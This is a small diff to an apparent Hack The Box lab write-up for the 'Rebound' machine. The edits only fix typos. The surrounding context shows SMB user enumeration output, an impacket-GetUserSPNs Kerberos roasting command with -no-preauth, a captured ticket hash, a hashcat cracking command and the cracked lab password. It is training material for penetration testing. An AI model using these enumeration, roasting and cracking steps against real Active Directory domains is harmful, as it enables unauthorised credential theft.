@@ -70,7 +70,7 @@ SMB         10.129.232.31   445    DC01             7685: rebound\batch_runner (
 SMB         10.129.232.31   445    DC01             7686: rebound\tbrady (SidTypeUser)
 SMB         10.129.232.31   445    DC01             7687: rebound\delegator$ (SidTypeUser)
 ```
-put all username is a file  
+put all username is a file user.txt  
 AS-REP Roasting found a hash of ldap_monitor
 ```console
 $ impacket-GetUserSPNs -no-preauth guest -usersfile user.txt -dc-host 10.129.232.31 rebound.htb/
@@ -88,7 +88,7 @@ $krb5tgs$23$*ldap_monitor$REBOUND.HTB$ldap_monitor*$643c9628897d6f4fd247b00753a2
 [-] Principal: batch_runner - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
 [-] Principal: tbrady - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
 ```
-hastcat crack it and got 1GR8t@$$4u
+hastcat cracked it and got 1GR8t@$$4u
 ```console
 $ hashcat -m 13100 hash.txt /home/ming/Downloads/rockyou.txt
 
